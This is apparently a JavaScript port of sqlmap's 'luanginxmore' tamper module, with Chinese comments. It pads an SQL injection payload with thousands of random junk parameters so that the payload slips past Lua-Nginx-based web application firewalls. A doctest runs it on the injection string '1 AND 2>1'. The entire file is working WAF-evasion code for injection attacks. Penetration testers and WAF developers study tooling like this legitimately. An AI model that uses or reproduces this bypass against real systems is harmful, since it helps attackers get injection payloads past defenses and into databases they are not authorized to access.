// 对标 sqlmap luanginxmore.py：LUA-Nginx WAF 超大规模参数数量溢出绕过
// 官方为 4,194,304 对参数（溢出 WAF 参数计数）；JS 版默认 10000 对并支持
// ctx.tamperHints.luaginxMoreCount 自定义（模块级缓存避免重复生成开销）
export const luanginxmore = {
  name: 'luanginxmore',
  description: '前缀超大规模随机垃圾参数对（Lua-Nginx WAF 参数计数溢出，Cloudflare 级）',
  doctests: [
    { input: '1 AND 2>1', match: '^[A-Za-z0-9]{2}=&' },
  ],
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const count = (ctx && ctx.tamperHints && Number(ctx.tamperHints.luaginxMoreCount)) || 10000;
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const parts = new Array(count);
    for (let i = 0; i < count; i++) {
      const a = chars[Math.floor(Math.random() * chars.length)];
      const b = chars[Math.floor(Math.random() * chars.length)];
      parts[i] = `${a}${b}=`;
    }
    return `${parts.join('&')}&${payload}`;
  },
};
export default luanginxmore;
